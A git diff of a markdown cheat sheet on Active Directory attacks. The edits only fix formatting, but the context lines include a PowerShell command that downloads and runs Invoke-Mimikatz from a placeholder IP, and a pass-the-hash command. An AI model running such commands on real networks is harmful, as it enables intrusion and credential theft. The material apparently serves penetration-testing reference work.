@@ -16,9 +16,9 @@ Last update: **18 Nov 2021**
   -  [Domain Trust Mapping](#domain-trust-mapping)
   -  [Domain Forest Enumeration](#domain-forest-enumeration)
   -  [User Hunting](#user-hunting)
--  [Local Privilege Escalation](#local-privilege-escalation)
--  [Lateral Movement](#lateral-movement)
--  [Persistence](#persistence)
+- [Local Privilege Escalation](#local-privilege-escalation)
+- [Lateral Movement](#lateral-movement)
+- [Persistence](#persistence)
   -  [Golden Ticket](#golden-ticket)
   -  [Silver Ticket](#silver-ticket)
   -  [Skeleton Key](#skeleton-key)
@@ -48,7 +48,7 @@ Import-Module .\ActiveDirectory\ActiveDirectory.psd1
 ```
 Link: [AD Module](https://github.com/samratashok/ADModule)
 
-# Enumeration:
+# Enumeration
 
 ### Users Enumeration
 
@@ -332,7 +332,7 @@ iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"'
 ```
 
-# Persistence:
+# Persistence
 
 ### Golden Ticket
 
